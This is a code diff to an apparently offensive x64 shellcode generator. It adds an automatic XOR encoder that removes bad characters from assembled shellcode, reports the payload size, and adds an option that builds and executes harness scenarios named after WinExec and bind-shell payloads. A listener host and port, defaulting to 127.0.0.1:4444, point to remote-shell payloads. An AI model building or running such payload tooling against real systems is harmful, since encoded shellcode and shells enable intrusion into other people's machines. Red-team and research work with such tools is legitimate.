@@ -579,6 +579,8 @@ def _emit_contract_md_x64(
     lines.append(f"Frame: `sub rsp, 0x{layout.frame_size:x}` "
                  f"(0x{layout.frame_size:x} bytes reserved)")
     lines.append("Addressing: RSP-relative (fixed frame, RSP does not move after prologue)")
+    if raw is not None:
+        lines.append(f"Shellcode size: **{len(raw)} bytes** (0x{len(raw):x})")
     lines.append("")
 
     lines.append("## Export Context (reserved, framework use)")
@@ -887,11 +889,13 @@ def build_x64(
     config: TemplateConfig | None = None,
     out_dir: str = "emitter_out",
     assemble: bool = True,
+    encode: bool = False,
 ) -> "BuildResult":
     """Run the full x64 build pipeline. Returns a BuildResult (same shape as x86).
 
     Mirrors build.build() but uses x64 stack allocator, x64 framework stubs,
-    and x64 compose pipeline.
+    and x64 compose pipeline. When *encode* is True and assembled output has
+    badchar violations, the XOR encoder is invoked automatically.
     """
     from .build import (
         BuildResult,
@@ -938,6 +942,8 @@ def build_x64(
     raw: bytes | None = None
     assembler: str | None = None
     asm_errors: list[str] = []
+    encoded_bytes: bytes | None = None
+    encoder_report: str | None = None
 
     if assemble:
         try:
@@ -948,7 +954,6 @@ def build_x64(
             raw = bytes(encoding)
             assembler = "keystone-x64"
 
-            # Post-assembly badchar validation (P0-4)
             bc_set = config.badchars
             if bc_set and raw:
                 violations = [
@@ -957,16 +962,27 @@ def build_x64(
                     if byte in bc_set
                 ]
                 if violations:
-                    samples = violations[:8]
-                    detail = ", ".join(
-                        f"0x{b:02x}@offset {o}" for o, b in samples
-                    )
-                    asm_errors.append(
-                        f"Badchar bytes in assembled output ({len(violations)} "
-                        f"occurrences): {detail}"
-                    )
-                    raw = None
-                    assembler = None
+                    if encode:
+                        from .xor_encoder import xor_encode
+                        enc = xor_encode(raw, bc_set)
+                        encoder_report = enc.diagnostics
+                        if enc.success:
+                            encoded_bytes = enc.encoded
+                        else:
+                            asm_errors.append(
+                                f"[!] Encoding failed: {enc.diagnostics}"
+                            )
+                    else:
+                        samples = violations[:8]
+                        detail = ", ".join(
+                            f"0x{b:02x}@offset {o}" for o, b in samples
+                        )
+                        asm_errors.append(
+                            f"Badchar bytes in assembled output ({len(violations)} "
+                            f"occurrences): {detail}"
+                        )
+                        raw = None
+                        assembler = None
         except ImportError:
             asm_errors.append("keystone not available; skipping x64 assembly")
         except Exception as e:
@@ -986,6 +1002,8 @@ def build_x64(
         layout=layout,
         assembler=assembler,
         asm_errors=asm_errors if asm_errors else None,
+        encoded_bytes=encoded_bytes,
+        encoder_report=encoder_report,
     )
 
 
@@ -1011,7 +1029,7 @@ def main_x64() -> None:
     parser = argparse.ArgumentParser(
         description="emitrion-x64: manifest -> x64 assembly + contract",
     )
-    parser.add_argument("manifest", help="Path to manifest YAML file")
+    parser.add_argument("manifest", nargs="?", help="Path to manifest YAML file")
     parser.add_argument(
         "--template", choices=valid_x64_templates, default=None,
         help="Override manifest template",
@@ -1030,8 +1048,45 @@ def main_x64() -> None:
     parser.add_argument("--dst", default=None, help="Destination path override")
     parser.add_argument("--no-assemble", action="store_true",
                         help="Skip assembly (generate .asm only)")
+    parser.add_argument("--encode", action="store_true",
+                        help="Apply XOR encoding when badchar violations are detected")
+    parser.add_argument("--run-scenario", metavar="NAME",
+                        help="Build from a named harness scenario and execute "
+                             "(e.g. test_a_winexec, test_e_bind_shell, or 'all')")
 
     args = parser.parse_args()
+
+    if args.run_scenario:
+        from .native_harness_x64 import run_scenario, run_all_scenarios, SCENARIOS
+        if args.run_scenario == "all":
+            results = run_all_scenarios()
+            for r in results:
+                icon = {
+                    "success": "[PASS]",
+                    "indeterminate": "[????]",
+                    "exception": "[EXCP]",
+                    "worker_crash": "[DEAD]",
+                    "setup_failure": "[FAIL]",
+                    "not_windows": "[SKIP]",
+                }.get(r.status, "[????]")
+                print(f"  {icon} {r.test_id}: {r.status}")
+                if r.failure_reason:
+                    print(f"         {r.failure_reason}")
+            sys.exit(0 if all(
+                r.passed or r.status == "not_windows"
+                for r in results
+            ) else 1)
+        else:
+            if args.run_scenario not in SCENARIOS:
+                print(f"[!] Unknown scenario: {args.run_scenario}", file=sys.stderr)
+                print(f"    Available: {', '.join(sorted(SCENARIOS))}", file=sys.stderr)
+                sys.exit(1)
+            result_exec = run_scenario(args.run_scenario)
+            print(result_exec.to_json())
+            sys.exit(0 if result_exec.passed else 1)
+
+    if not args.manifest:
+        parser.error("manifest is required unless --run-scenario is used")
 
     lhost = _resolve_lhost(args.lhost) if args.lhost else "127.0.0.1"
     lport = args.lport or 4444
@@ -1051,6 +1106,7 @@ def main_x64() -> None:
         config=config,
         out_dir=args.out,
         assemble=not args.no_assemble,
+        encode=args.encode,
     )
     write_outputs(result, args.out)
 
@@ -1062,6 +1118,8 @@ def main_x64() -> None:
         print(f"[+] Assembler: {result.assembler}")
         print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes")
         print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
+        if result.encoded_bytes:
+            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
         if result.asm_errors:
             for err in result.asm_errors:
                 print(f"[!] {err}", file=sys.stderr)
